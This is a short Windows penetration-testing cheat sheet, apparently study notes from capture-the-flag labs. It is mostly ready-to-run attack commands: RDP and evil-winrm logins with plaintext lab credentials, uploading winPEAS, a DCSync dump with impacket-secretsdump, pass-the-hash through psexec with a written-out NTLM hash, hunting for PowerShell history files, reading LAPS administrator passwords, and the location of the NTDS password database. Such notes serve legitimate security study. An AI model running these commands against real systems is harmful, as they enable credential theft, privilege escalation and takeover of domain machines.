# Windows Commands

Used to gain access through RDS.
```
xfreerdp /v:10.10.29.125 /u:thm-unpriv /p:Password321 +clipboard
```

#### Evil-WinRm

connect to system with eveil-winrm
```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
command to upload files through win-rm
```
upload ~/windows_programs/winPEASany.exe
```

#### DCSync Attack
```
impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```

#### Pass-the-Hash attack
```
impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

##### look for Console_Host_History file 
```
Get-ChildItem -Path C:\ -Include ConsoleHost_history*.txt -File -Recurse -ErrorAction SilentlyContinue
```

#### If in the LAPS reader group : 
```
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
```
Domain passwords location: ```C:\Windows\NTDS\```
